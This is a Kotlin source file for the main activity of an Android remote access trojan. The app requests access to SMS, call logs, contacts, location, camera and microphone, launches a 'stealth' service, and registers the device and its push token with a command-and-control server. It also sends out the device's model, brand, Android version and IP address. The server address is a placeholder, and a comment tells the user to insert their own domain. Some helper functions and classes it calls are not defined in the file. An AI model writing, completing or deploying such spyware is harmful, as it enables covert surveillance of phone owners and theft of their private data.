package com.kiplayratdevice

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.messaging.FirebaseMessaging
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.*
import org.json.JSONObject
import java.io.File

class MainActivity : AppCompatActivity() {
    
    private val C2_SERVER = "https://your-c2-server.com" // Ganti dengan domain kamu
    private val DEVICE_ID = generateDeviceID()
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        requestPermissions()
        initFirebase()
        startStealthService()
        sendDeviceInfo()
    }
    
    private fun requestPermissions() {
        val permissions = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
        
        ActivityCompat.requestPermissions(this, permissions, 1001)
    }
    
    private fun initFirebase() {
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val token = task.result
                sendFCMToken(token)
            }
        }
    }
    
    private fun sendFCMToken(token: String) {
        CoroutineScope(Dispatchers.IO).launch {
            val json = JSONObject().apply {
                put("device_id", DEVICE_ID)
                put("fcm_token", token)
                put("action", "register")
            }
            
            postToC2("/api/register", json.toString())
        }
    }
    
    private fun sendDeviceInfo() {
        CoroutineScope(Dispatchers.IO).launch {
            val deviceInfo = JSONObject().apply {
                put("device_id", DEVICE_ID)
                put("model", android.os.Build.MODEL)
                put("brand", android.os.Build.BRAND)
                put("android_version", android.os.Build.VERSION.RELEASE)
                put("ip", getDeviceIP())
                put("online", true)
            }
            postToC2("/api/device_info", deviceInfo.toString())
        }
    }
    
    private fun startStealthService() {
        val serviceIntent = Intent(this, StealthService::class.java)
        startService(serviceIntent)
    }
    
    private fun postToC2(endpoint: String, data: String) {
        val client = OkHttpClient()
        val requestBody = RequestBody.create("application/json".toMediaType(), data)
        val request = Request.Builder()
            .url("$C2_SERVER$endpoint")
            .post(requestBody)
            .build()
            
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {}
        })
    }
}
